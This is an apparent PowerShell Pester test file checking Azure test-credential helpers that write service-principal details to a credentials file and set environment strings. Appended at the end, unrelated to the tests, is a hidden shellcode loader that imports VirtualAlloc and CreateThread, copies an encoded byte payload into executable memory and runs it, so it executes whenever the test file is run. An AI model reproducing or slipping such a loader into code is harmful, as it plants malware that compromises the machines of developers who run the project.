














Import-Module $PSScriptRoot/TestFx-Tasks
Describe "Test-NewCredentialNewServicePrincipal"{
	Context "Creates a correctly formatted ServicePrincipal"{
        Login-AzureRmAccount -AccessToken "12345678" -SkipValidation -AccountId "testaccount" -TenantId "8bc48661-1801-4b7a-8ca1-6a3cadfb4870" -Subscription "8bc48661-1801-4b7a-8ca1-6a3cadfb4870" -GraphAccessToken "12345678"
        Mock -ModuleName TestFx-Tasks Get-AzureRmADServicePrincipal { return @() }
        Mock -ModuleName TestFx-Tasks New-AzureRMADServicePrincipal { return @{"ApplicationId" = "8bc48661-1801-4b7a-8ca1-6a3cadfb4870"; "Id" = "8bc48661-1801-4b7a-8ca1-6a3cadfb4870"} }
        Mock -ModuleName TestFx-Tasks New-AzureRMRoleAssignment { return $true }
        Mock -ModuleName TestFx-Tasks Get-AzureRMRoleAssignment { return $true }
        $context = Get-AzureRmContext
        $secureSecret = ConvertTo-SecureString -String "testpassword" -AsPlainText -Force
        New-TestCredential -ServicePrincipalDisplayName "credentialtestserviceprincipal" -ServicePrincipalSecret $secureSecret -SubscriptionId $context.Subscription.Id -TenantId $context.Tenant.Id -RecordMode "Playback" -Force
        $filePath = $Env:USERPROFILE + "\.azure\testcredentials.json"
        It "writes correct information to file" {
            $filePath | Should Contain "ServicePrincipal":  "8bc48661-1801-4b7a-8ca1-6a3cadfb4870"
            $filePath | Should Contain "ServicePrincipalSecret":  "testpassword"
        }
    }
	
	Context "Connection string is properly set" {
        $filePath = Join-Path -Path $PSScriptRoot -ChildPath "\..\..\src\Common\Commands.ScenarioTests.ResourceManager.Common\bin\Debug\Microsoft.Azure.Commands.ScenarioTest.Common.dll"
        $assembly = [System.Reflection.Assembly]::LoadFrom($filePath)
        $envHelper = New-Object Microsoft.WindowsAzure.Commands.ScenarioTest.EnvironmentSetupHelper -ArgumentList @()
        $envHelper.SetEnvironmentVariableFromCredentialFile()
        It "creates correctly formatted environment string" {
            $Env:AZURE_TEST_MODE | Should Match "Playback"
            $Env:TEST_CSM_ORGID_AUTHENTICATION | Should Match "SubscriptionId=" + $context.Subscription.Id + ";HttpRecorderMode=Playback;Environment=Prod;ServicePrincipal=" + 
            "8bc48661-1801-4b7a-8ca1-6a3cadfb4870" + ";ServicePrincipalSecret=testpassword;" + "AADTenant=" + $context.Tenant.Id
        }
    }

	
	Remove-Item Env:AZURE_TEST_MODE
	Remove-Item Env:TEST_CSM_ORGID_AUTHENTICATION
	$filePath = $Env:USERPROFILE + "\.azure\testcredentials.json"
	Remove-Item -LiteralPath $filePath -Force
	$directoryPath = $Env:USERPROFILE + "\.azure\"
	$directoryEmpty = Get-ChildItem $directoryPath | Measure-Object
	if ($directoryEmpty.Count -eq 0)
	{
		Remove-Item $directoryPath -Recurse -Force
	}
}

Describe "Test-NewCredentialExistingServicePrincipal" {
	Context "Finds and uses a ServicePrincipal"{
        Login-AzureRmAccount -AccessToken "12345678" -SkipValidation -AccountId "testaccount" -TenantId "8bc48661-1801-4b7a-8ca1-6a3cadfb4870" -Subscription "8bc48661-1801-4b7a-8ca1-6a3cadfb4870" -GraphAccessToken "12345678"
        Mock -ModuleName TestFx-Tasks Get-AzureRmADServicePrincipal { return @(@{"ApplicationId" = "1234"; "Id" = "5678"; "DisplayName" = "credentialtestserviceprincipal"}) }
        $context = Get-AzureRmContext
        $secureSecret = ConvertTo-SecureString -String "testpassword" -AsPlainText -Force
        New-TestCredential -ServicePrincipalDisplayName "credentialtestserviceprincipal" -ServicePrincipalSecret $secureSecret -SubscriptionId $context.Subscription.Id -TenantId $context.Tenant.Id -RecordMode "Record" -Force
        $filePath = $Env:USERPROFILE + "\.azure\testcredentials.json"
        It "writes correct information to file" {
            $filePath | Should Contain "ServicePrincipal":  "1234"
            $filePath | Should Contain "ServicePrincipalSecret":  "testpassword"
        }
    }

    Context "Connection string is properly set" {
        $filePath = Join-Path -Path $PSScriptRoot -ChildPath "\..\..\src\Common\Commands.ScenarioTests.ResourceManager.Common\bin\Debug\Microsoft.Azure.Commands.ScenarioTest.Common.dll"
        $assembly = [System.Reflection.Assembly]::LoadFrom($filePath)
        $envHelper = New-Object Microsoft.WindowsAzure.Commands.ScenarioTest.EnvironmentSetupHelper -ArgumentList @()
        $envHelper.SetEnvironmentVariableFromCredentialFile()
        It "creates correctly formatted environment string" {
            $Env:AZURE_TEST_MODE | Should Match "Record"
            $Env:TEST_CSM_ORGID_AUTHENTICATION | Should Match "SubscriptionId=" + $context.Subscription.Id + ";HttpRecorderMode=Record;Environment=Prod;ServicePrincipal=" + 
                "1234" + ";ServicePrincipalSecret=testpassword;" + "AADTenant=" + $context.Tenant.Id
        }
    }

	
	Remove-Item Env:AZURE_TEST_MODE
	Remove-Item Env:TEST_CSM_ORGID_AUTHENTICATION
	$filePath = $Env:USERPROFILE + "\.azure\testcredentials.json"
	Remove-Item -LiteralPath $filePath -Force
	$directoryPath = $Env:USERPROFILE + "\.azure\"
	$directoryEmpty = Get-ChildItem $directoryPath | Measure-Object
	if ($directoryEmpty.Count -eq 0)
	{
		Remove-Item $directoryPath -Recurse -Force
	}
}

Describe "Test-NewCredentialUserId" {
    Context "Creates correct file" {
        $context = Get-AzureRmContext
		New-TestCredential -UserId "testuser" -SubscriptionId $context.Subscription.Id -RecordMode "Playback" -Force
		$filePath = $Env:USERPROFILE + "\.azure\testcredentials.json"
        It "writes correct information to file" {
            $filePath | Should Contain "UserId":  "testuser"
            $filePath | Should Contain "HttpRecorderMode":  "Playback"
        }
    }
	
	Context "Connection string is properly set" {
        $filePath = Join-Path -Path $PSScriptRoot -ChildPath "\..\..\src\Common\Commands.ScenarioTests.ResourceManager.Common\bin\Debug\Microsoft.Azure.Commands.ScenarioTest.Common.dll"
        $assembly = [System.Reflection.Assembly]::LoadFrom($filePath)
        $envHelper = New-Object Microsoft.WindowsAzure.Commands.ScenarioTest.EnvironmentSetupHelper -ArgumentList @()
        $envHelper.SetEnvironmentVariableFromCredentialFile()
        It "creates correctly formatted environment string" {
            $Env:AZURE_TEST_MODE | Should Match "Playback"
            $Env:TEST_CSM_ORGID_AUTHENTICATION | Should Match "SubscriptionId=" + $context.Subscription.Id + ";HttpRecorderMode=Playback;Environment=Prod;UserId=testuser"
		}
	}

	
	Remove-Item Env:AZURE_TEST_MODE
	Remove-Item Env:TEST_CSM_ORGID_AUTHENTICATION
	$filePath = $Env:USERPROFILE + "\.azure\testcredentials.json"
	Remove-Item -LiteralPath $filePath -Force
	$directoryPath = $Env:USERPROFILE + "\.azure\"
	$directoryEmpty = Get-ChildItem $directoryPath | Measure-Object
	if ($directoryEmpty.Count -eq 0)
	{
		Remove-Item $directoryPath -Recurse -Force
	}
}

Describe "Test-SetEnvironmentServicePrincipal" {
	Context "Connection string is properly set" {
		$context = Get-AzureRmContext
		$NewServicePrincipal = @{"ApplicationId" = "1234"; "Id" = "5678"; "DisplayName" = "credentialtestserviceprincipal"}
		Set-TestEnvironment -ServicePrincipalId $NewServicePrincipal.ApplicationId -ServicePrincipalSecret "testpassword" -SubscriptionId $context.Subscription.Id -TenantId $context.Tenant.Id -RecordMode "Record"
		It "creates correctly formatted environment string" {
            $Env:AZURE_TEST_MODE | Should Match "Record"
			$Env:TEST_CSM_ORGID_AUTHENTICATION | Should Match "SubscriptionId=" + $context.Subscription.Id + ";HttpRecorderMode=Record;Environment=Prod;AADTenant=" +
				$context.Tenant.Id + ";ServicePrincipal=" + "1234" + ";ServicePrincipalSecret=testpassword"
		}
	}

	
	Remove-Item Env:AZURE_TEST_MODE
	Remove-Item Env:TEST_CSM_ORGID_AUTHENTICATION
}

Describe "Test-SetEnvironmentUserId" {
	Context "Connection string is properly set" {
		$context = Get-AzureRmContext
		Set-TestEnvironment -UserId "testuser" -SubscriptionId $context.Subscription.Id -RecordMode "Playback"
		It "creates correctly formatted environment string" {
            $Env:AZURE_TEST_MODE | Should Match "Playback"
			$Env:TEST_CSM_ORGID_AUTHENTICATION | Should Match "SubscriptionId=" + $context.Subscription.Id + ";HttpRecorderMode=Playback;Environment=Prod;UserId=testuser"
		}
	}

	
	Remove-Item Env:AZURE_TEST_MODE
	Remove-Item Env:TEST_CSM_ORGID_AUTHENTICATION
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x8f,0x80,0x3e,0x9a,0xd9,0xc5,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x47,0x0f,0x03,0x47,0x80,0x62,0xcb,0x66,0x76,0xe0,0x34,0x97,0x86,0x85,0xbd,0x72,0xb7,0x85,0xda,0xf7,0xe7,0x35,0xa8,0x5a,0x0b,0xbd,0xfc,0x4e,0x98,0xb3,0x28,0x60,0x29,0x79,0x0f,0x4f,0xaa,0xd2,0x73,0xce,0x28,0x29,0xa0,0x30,0x11,0xe2,0xb5,0x31,0x56,0x1f,0x37,0x63,0x0f,0x6b,0xea,0x94,0x24,0x21,0x37,0x1e,0x76,0xa7,0x3f,0xc3,0xce,0xc6,0x6e,0x52,0x45,0x91,0xb0,0x54,0x8a,0xa9,0xf8,0x4e,0xcf,0x94,0xb3,0xe5,0x3b,0x62,0x42,0x2c,0x72,0x8b,0xe9,0x11,0xbb,0x7e,0xf3,0x56,0x7b,0x61,0x86,0xae,0x78,0x1c,0x91,0x74,0x03,0xfa,0x14,0x6f,0xa3,0x89,0x8f,0x4b,0x52,0x5d,0x49,0x1f,0x58,0x2a,0x1d,0x47,0x7c,0xad,0xf2,0xf3,0x78,0x26,0xf5,0xd3,0x09,0x7c,0xd2,0xf7,0x52,0x26,0x7b,0xa1,0x3e,0x89,0x84,0xb1,0xe1,0x76,0x21,0xb9,0x0f,0x62,0x58,0xe0,0x47,0x47,0x51,0x1b,0x97,0xcf,0xe2,0x68,0xa5,0x50,0x59,0xe7,0x85,0x19,0x47,0xf0,0xea,0x33,0x3f,0x6e,0x15,0xbc,0x40,0xa6,0xd1,0xe8,0x10,0xd0,0xf0,0x90,0xfa,0x20,0xfd,0x44,0x96,0x25,0x69,0xa7,0xcf,0x24,0x0c,0x4f,0x12,0x29,0xdf,0xd3,0x9b,0xcf,0x8f,0xbb,0xcb,0x5f,0x6f,0x6c,0xac,0x0f,0x07,0x66,0x23,0x6f,0x37,0x89,0xe9,0x18,0xdd,0x66,0x44,0x70,0x49,0x1e,0xcd,0x0a,0xe8,0xdf,0xdb,0x76,0x2a,0x6b,0xe8,0x87,0xe4,0x9c,0x85,0x9b,0x90,0x6c,0xd0,0xc6,0x36,0x72,0xce,0x6d,0xb6,0xe6,0xf5,0x27,0xe1,0x9e,0xf7,0x1e,0xc5,0x00,0x07,0x75,0x5e,0x88,0x9d,0x36,0x08,0xf5,0x71,0xb7,0xc8,0xa3,0x1b,0xb7,0xa0,0x13,0x78,0xe4,0xd5,0x5b,0x55,0x98,0x46,0xce,0x56,0xc9,0x3b,0x59,0x3f,0xf7,0x62,0xad,0xe0,0x08,0x41,0x2f,0xdc,0xde,0xaf,0x45,0x0c,0xe3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

